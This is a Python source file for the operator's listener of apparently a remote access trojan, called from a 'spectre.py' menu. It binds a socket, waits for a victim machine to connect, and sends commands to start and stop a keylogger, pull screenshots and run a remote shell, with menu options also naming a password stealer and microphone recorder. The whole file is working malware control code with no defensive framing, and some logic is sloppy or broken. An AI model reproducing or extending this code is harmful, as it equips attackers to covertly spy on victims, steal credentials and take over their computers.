import socket
import os
import sys
import colorama
import time


        
options = '''
keylogger
screenshot
recurring
emailupdate
passwdstealer
micrecorder
***Type no <option> to cancel option***
***Type listen to initialize listener***
***Type back to go to menu***
    '''

keylogger = False
screenshot = False
recurring = False
emailupdate = False
passwdstealer = False
micrecorder = False
shell = False

def main():
    os.system('cls')
    print('                                                                        ')
    print('██╗     ██╗███████╗████████╗███╗   ██╗███████╗███╗   ██╗███████╗██████╗ ')
    print('██║     ██║██╔════╝╚══██╔══╝████╗  ██║██╔════╝████╗  ██║██╔════╝██╔══██╗')
    print('██║     ██║███████╗   ██║   ██╔██╗ ██║█████╗  ██╔██╗ ██║█████╗  ██████╔╝')
    print('██║     ██║╚════██║   ██║   ██║╚██╗██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗')
    print('███████╗██║███████║   ██║   ██║ ╚████║███████╗██║ ╚████║███████╗██║  ██║')
    print('╚══════╝╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝')
    print('Select which options you put for your payload')
    while True:
        
        inp = input(':>')
        if inp == 'options':
            print(options)
        elif inp == 'clear':
            os.system('cls')
            main()
        elif inp == 'exit':
            print('bye bye')
            exit()
        elif inp == 'listen':
            ip = input('Enter Listening IP:>')
            port = int(input('Enter Listening Port:>'))
            listen(ip, port)
        elif inp == 'back':
            os.system('python spectre.py')
        else:
            print('unrecognized command')
            time.sleep(1)
            main()
            
def recvall(serv, msgLen):
    msg = ""
    bytesRcvd = 0

    while bytesRcvd < msgLen:

        chunk = serv.recv(msgLen - bytesRcvd)

        if chunk == "": break

        bytesRcvd += len(chunk)
        msg += chunk

        if "\r\n" in msg: break
    return msg

def exploit():
    print('----------EXPLOITS------------')
    print('Type list To List Exploits    ')
    print('Exploit syntax: <exploit name>')
    print('------------------------------')
    print('Type back to go to exploitation menu')
    poop = ('''
keylogger
screenshot
recurring
emailupdate
passwdstealer
micrecorder
***type stop <option> to cancel on remote target
''')
    while True:
        inp = input(':>')
        if inp == 'list':
            print(poop)
        if inp == 'keylogger':
            message = ('keylogger')
            conn.send(message.encode())
            print('logging keystrokes on remote target')
            time.sleep(1)
            exploit()
        if inp == 'stop keylogger':
            message = ('stop')
            conn.send(message.encode())
            print('keylogger stopped on remote target')
            time.sleep(1)
            exploit
        if inp == 'screenshot':
                message = 'screenshot'
                conn.send(message.encode())
                size = conn.recv(4096)
                myfile = open("screen.png", 'a')
                data = str(size)
                myfile.write(data)
                conn.send(message.encode())
                data = conn.recv(40960000)
                basename = "screen.png"
                if not data:
                    break
                else:
                    print('data recieved')
                    myfile = open(basename, 'wb')
                    myfile.write(data)
                    myfile.close()
                    print("GOT IMAGE")
                    exploit()
        if inp == 'back':
            connect()
        
    
    
def shell():
    command = input(':>')
    if command == 'back':
        os.system('cls')
        connect()
    try:
        conn.send(command.encode())
        rx = conn.recv(1024)
        rx = rx.decode()
        print('>', rx)
        shell()
    except:
        print('Connection Closed :( ')
        print('Going back to listener')
        sock.close()
        time.sleep(2)
        main()
        
        

def connect():
        print('--------YOURE IN----------')
        print('      1. Exploits         ')
        print('      2. Shell            ')
        print('      3. Exit             ')
        print('--------------------------')
        inp = input(':>')
        if inp == '1':
            exploit()
        elif inp == '2':
            print('Type "back" to go to previous menu')
            shell()
        elif inp == '3':
            print('bye bye')
            time.sleep(1)
            exit() 
        else:
            print('unrecognized command')
            time.sleep(1)
            os.system('cls')
            connect()
            
def listen(ip, port):
    global conn
    global addr
    global sock
    global serv
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.bind((ip, port))
    serv.listen()
    print('Listening on Port:', port,'with IP:', ip)
    while True:
        conn, addr = serv.accept()
        from_client = ''
        with conn:
            print('Connection Established')
            print('Session Created with' , addr)
            connect()

if __name__=='__main__':
    main()
